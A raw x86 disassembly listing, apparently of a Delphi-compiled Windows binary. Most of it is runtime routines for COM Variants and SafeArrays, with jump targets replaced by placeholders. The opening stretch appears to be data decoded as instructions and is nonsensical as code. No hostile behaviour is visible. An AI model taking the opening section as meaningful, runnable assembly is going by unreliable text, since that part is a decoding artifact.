add [ eax ] bl
inc ebp
push esi
popad
jb r-xdata
in al 0x31
inc eax
add [ eax ] al
xor al [ eax ]
cmp al 0x32
outsd
inc eax
jb r-xdata
jo r-xdata
popad
je r-xdata
jb r-xdata
inc ebp
jb r-xdata
add ah ah
xor [ eax ] eax
add [ edx ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
call 0x4ce8e6
add [ eax ] al
mov eax 0x9400407a
xor al 0x40
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
outsd
outsd
arpl [ ebx + 0x65 ] bp
inc ebp
jb r-xdata
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ edx + esi ] bh
inc eax
add [ eax * 2 + 0x69726156 ] dl
inc eax
add [ eax - 0x18 ] ch
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x18 ] ch
inc eax
add [ eax + eax ] cl
add [ eax ] al
mov eax 0x9400407a
xor al 0x40
outsd
jb r-xdata
dec ecx
inc eax
add [ eax ] al
call sub_40e7fa
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ edx + esi ] bh
inc eax
add [ eax ] bl
inc ebp
push esi
popad
jb r-xdata
jb r-xdata
outsb
je r-xdata
popad
outsb
je r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
inc eax
add [ eax + eax ] cl
add [ eax ] al
mov eax 0x9400407a
xor al 0x40
outsd
jb r-xdata
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
jb r-xdata
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
jb r-xdata
popad
outsb
je r-xdata
rcr [ eax + 0x40e7 ] 0x0
popad
jb r-xdata
popad
jns r-xdata
outsb
js r-xdata
movsb [ edi ] [ esi ]
popad
push esi
popad
jb r-xdata
add [ eax ] al
jb r-xdata
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ edx + esi ] bh
inc eax
add [ eax ] bl
inc ebp
push esi
popad
jb r-xdata
imul esp [ ecx + 0x6e ] 0x64614274
dec ecx
adc eax 0x72615645
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cwde
out 0x40 eax
add [ eax + eax ] cl
add [ eax ] al
mov eax 0x9400407a
xor al 0x40
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
outsd
jb r-xdata
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ edx + esi ] bh
inc eax
add [ 0x72615645 ] dl
out 0x40 eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] dh
inc eax
add [ eax + eax ] cl
add [ eax ] al
mov eax 0x9400407a
xor al 0x40
add [ eax - 0x5bffbfcc ] ah
sub_40e9b0
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e9fa
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b938
call sub_4039d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ea01
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
sub_40ea04
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40ea93
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_413cc0
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_413cc0
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b974
call sub_4039d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ea9a
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403fc0
retn
sub_40eaa0
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40eaea
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b938
call sub_4039d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40eaf1
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
sub_40eaf4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40eb83
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_413cc0
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_413cc0
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b974
call sub_4039d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40eb8a
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403fc0
retn
sub_40eb90
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40ebda
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b938
call sub_4039d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ebe1
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
sub_40ebe4
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40ee29
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
cmp eax 0x8002000a
jg r-xdata
sub eax 0x8002000b
je r-xdata
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b938
call sub_4039d8
jmp r-xdata
sub eax 0x2
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b938
call sub_4039d8
jmp r-xdata
cmp eax 0x80020005
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ee30
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_403fc0
lea eax [ ebp - 0x20 ]
mov edx 0x8
call sub_403fc0
retn
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b938
call sub_4039d8
jmp r-xdata
sub eax 0x50001
je r-xdata
sub eax 0x80020008
je r-xdata
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b938
call sub_4039d8
jmp r-xdata
sub eax 0x49
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b938
call sub_4039d8
jmp r-xdata
dec eax
je r-xdata
call sub_40e9b0
jmp r-xdata
sub eax 0x80004001
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b938
call sub_4039d8
jmp r-xdata
jmp r-xdata
call sub_40eaa0
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b938
call sub_4039d8
jmp r-xdata
sub eax 0xbffe
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] 0x0
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40b124
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
lea eax [ ebp - 0x38 ]
push eax
push 0x2
lea edx [ ebp - 0x40 ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b974
call sub_4039d8
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b938
call sub_4039d8
jmp r-xdata
jmp r-xdata
sub_40ee44
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov ebx eax
sub ebx 0x80020005
je r-xdata
mov eax edx
mov edx ecx
call sub_40ea04
jmp r-xdata
sub ebx 0x5
je r-xdata
mov eax edx
mov edx ecx
call sub_40eaf4
jmp r-xdata
jmp r-xdata
call sub_40ebe4
sub_40ee78
push ebx
push esi
mov esi edx
mov ebx eax
call sub_402844
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
call sub_402844
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov ecx esi
mov edx ebx
mov eax 0x8002000a
call sub_40ee44
pop esi
pop ebx
retn
call sub_402844
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov ecx esi
mov edx ebx
mov eax 0x8002000a
call sub_40ee44
jmp r-xdata
call sub_402884
mov edx eax
mov eax edx
call sub_4039d8
mov ecx esi
mov edx ebx
mov eax 0x80020005
call sub_40ee44
jmp r-xdata
pop esi
pop ebx
retn
sub_40eefc
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40ef46
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b938
call sub_4039d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ef4d
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
sub_40ef64
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40ef94
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40ef94
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40eff0
push ebp
mov ebp esp
add esp 0xfffffce8
push ebx
push esi
push edi
mov [ ebp - 0x304 ] eax
mov eax [ ebp - 0x304 ]
test [ eax + 0x1 ] 0x20
jne r-xdata
mov eax [ ebp - 0x304 ]
mov ax [ eax ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40ee38
mov eax [ ebp - 0x304 ]
push eax
call VariantClear
call sub_40ee38
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x304 ]
test ah 0x40
je r-xdata
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x308 ] eax
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x308 ] eax
jmp r-xdata
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x308 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40ef64
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
mov eax esi
mov [ ebp - 0x318 ] eax
mov eax [ ebp - 0x318 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetLBound
call sub_40ee38
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetUBound
call sub_40ee38
mov eax [ ebp - 0x318 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x318 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov eax ebx
call sub_40ef94
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayPtrOfIndex
call sub_40ee38
mov eax [ ebp - 0x314 ]
call sub_40f1e8
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
sub_40f16c
push ebx
push esi
push ecx
mov ebx eax
mov si [ ebx ]
cmp si 0x14
jae r-xdata
cmp si 0x100
jne r-xdata
push ebx
call VariantClear
call sub_40ee38
jmp r-xdata
cmp si 0x101
jne r-xdata
mov [ ebx ] 0x0
lea eax [ ebx + 0x8 ]
call sub_403f9c
jmp r-xdata
pop edx
pop esi
pop ebx
retn
test si 0x2000
je r-xdata
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax esi
call sub_415874
test al al
je r-xdata
mov eax ebx
call sub_40eff0
jmp r-xdata
push ebx
call VariantClear
call sub_40ee38
mov edx ebx
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
sub_40f204
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40f234
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40f234
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40f290
push ebp
mov ebp esp
add esp 0xfffffce0
push ebx
push esi
push edi
mov [ ebp - 0x308 ] ecx
mov ebx edx
mov [ ebp - 0x304 ] eax
test [ ebx + 0x1 ] 0x20
jne r-xdata
mov ax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40ee38
push ebx
mov eax [ ebp - 0x304 ]
push eax
call VariantCopy
call sub_40ee38
test ah 0x40
je r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x314 ] eax
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x314 ] eax
jmp r-xdata
lea eax [ ebp - 0x300 ]
push eax
mov eax [ ebp - 0x310 ]
push eax
push 0xc
call SafeArrayCreate
mov esi eax
test esi esi
jne r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x314 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x304 ]
call sub_40f1e8
mov eax [ ebp - 0x304 ]
mov [ eax ] 0x200c
mov eax [ ebp - 0x304 ]
mov [ eax + 0x8 ] esi
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
call sub_40eb90
mov eax esi
mov [ ebp - 0x320 ] eax
mov eax [ ebp - 0x320 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetLBound
call sub_40ee38
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetUBound
call sub_40ee38
mov eax [ ebp - 0x320 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x320 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40f204
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
push ebp
mov eax ebx
call sub_40f234
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x318 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayPtrOfIndex
call sub_40ee38
lea eax [ ebp - 0x31c ]
push eax
lea eax [ ebp - 0x100 ]
push eax
push esi
call SafeArrayPtrOfIndex
call sub_40ee38
mov eax [ ebp - 0x318 ]
mov edx eax
mov eax [ ebp - 0x31c ]
call [ ebp - 0x308 ]
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f464
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov di [ esi ]
cmp di 0x14
jae r-xdata
mov eax ebx
call sub_40f16c
cmp di 0x100
jne r-xdata
push esi
push ebx
call VariantCopy
call sub_40ee38
jmp r-xdata
cmp di 0x101
jne r-xdata
mov [ ebx ] 0x100
xor eax eax
mov [ ebx + 0x8 ] eax
lea eax [ ebx + 0x8 ]
mov edx [ esi + 0x8 ]
call sub_403ff0
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
test di 0x2000
je r-xdata
mov [ ebx ] di
mov eax [ esi + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax edi
call sub_415874
test al al
je r-xdata
mov ecx sub_40f45c
mov edx esi
mov eax ebx
call sub_40f290
jmp r-xdata
push esi
push ebx
call VariantCopy
call sub_40ee38
push 0x0
mov ecx esi
mov edx ebx
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x28 ]
jmp r-xdata
sub_40f510
push ebx
push esi
mov ebx edx
mov esi eax
cmp esi ebx
je r-xdata
pop esi
pop ebx
retn
test [ ebx ] 0xbfe8
jne r-xdata
mov edx ebx
mov eax esi
call sub_40f464
test [ esi ] 0xbfe8
je r-xdata
mov eax [ ebx ]
mov [ esi ] eax
mov eax [ ebx + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0xc ]
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax esi
call sub_40f16c
sub_40f554
push ebx
push esi
mov esi edx
mov ebx eax
cmp ebx esi
je r-xdata
push esi
push ebx
call VariantCopyInd
call sub_40ee38
pop esi
pop ebx
retn
mov eax ebx
call sub_40f1e8
sub_40f584
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
mov edx esp
mov ax [ ebx ]
call sub_415874
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_40f554
push 0x1
mov ecx ebx
mov edx esi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x28 ]
jmp r-xdata
pop edx
pop esi
pop ebx
retn
sub_40f5b8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40f781
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
and edx 0xffffbfff
cmp edx 0x14
ja r-xdata
test ah 0x20
je r-xdata
jmp [ edx * 4 + jump_table_40f5ed ]
mov edx ebx
mov eax esi
call sub_40f584
mov ecx sub_40f57c
mov edx ebx
mov eax esi
call sub_40f290
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
movsx edx [ edx ]
mov cl 0xfe
call sub_4135f0
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
mov cl 0xfc
call sub_4135f0
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
mov eax esi
call sub_4137e8
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
mov eax esi
call sub_4137e8
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
mov eax esi
call sub_413810
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
mov eax esi
call sub_4137e8
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_40f574
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4138a0
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov dx [ edx ]
neg dx
sbb edx edx
neg edx
call sub_4137c0
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
movsx edx [ edx ]
mov cl 0xff
call sub_4135f0
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
movzx edx [ edx ]
mov cl 0x1
call sub_4135f0
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
movzx edx [ edx ]
mov cl 0x2
call sub_4135f0
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
mov cl 0x4
call sub_4135f0
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax + 0x4 ]
mov eax [ eax ]
push edx
push eax
mov eax esi
call sub_4136ec
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40f790
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40f554
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f788
lea eax [ ebp - 0x4 ]
call sub_4046a8
retn
sub_40f7a4
push ebx
push esi
mov ebx eax
mov eax [ edx + 0x8 ]
call sub_404dc4
mov esi eax
mov eax ebx
call sub_40f1e8
mov [ ebx ] 0x8
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
sub_40f7cc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f828
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x10 ]
call sub_40f510
lea eax [ ebp - 0x10 ]
call [ rw-data ]
movzx ecx di
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_40fa54
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f82f
lea eax [ ebp - 0x10 ]
call sub_40f1e8
retn
sub_40f838
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f876
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_412ea0
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_4138a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f87d
lea eax [ ebp - 0x4 ]
call sub_4046a8
retn
sub_40f884
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f8c2
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_412778
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_413824
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f8c9
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
sub_40f8d0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f90e
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_413544
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_413904
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f915
lea eax [ ebp - 0x4 ]
call sub_4059cc
retn
sub_40f91c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f95a
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_413478
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_4138d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f961
lea eax [ ebp - 0x4 ]
call sub_4059cc
retn
sub_40f968
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov ax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0x14
jb r-xdata
mov edx esi
and dx 0xfff
cmp dx 0x14
jae r-xdata
mov edx ebx
mov eax edi
mov ecx 0x8
call sub_40fa54
push esi
push 0x0
push 0x400
push edi
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov ecx esi
call sub_40ee44
jmp r-xdata
mov edx esi
call sub_40ea04
push esi
push 0x0
push 0x400
push ebx
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov ecx esi
call sub_40ee44
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_40f9e8
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov ebx edx
mov edi eax
mov bp [ ebx ]
cmp bp 0x101
jne r-xdata
mov edx esp
mov eax ebp
call sub_415874
test al al
je r-xdata
mov edx ebx
mov eax edi
mov ecx esi
call sub_40f7cc
jmp r-xdata
mov edx esp
mov eax esi
call sub_415874
test al al
je r-xdata
push esi
mov ecx ebx
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx esi
call sub_40f968
mov ecx ebx
mov edx edi
mov eax [ esp ]
mov ebx [ eax ]
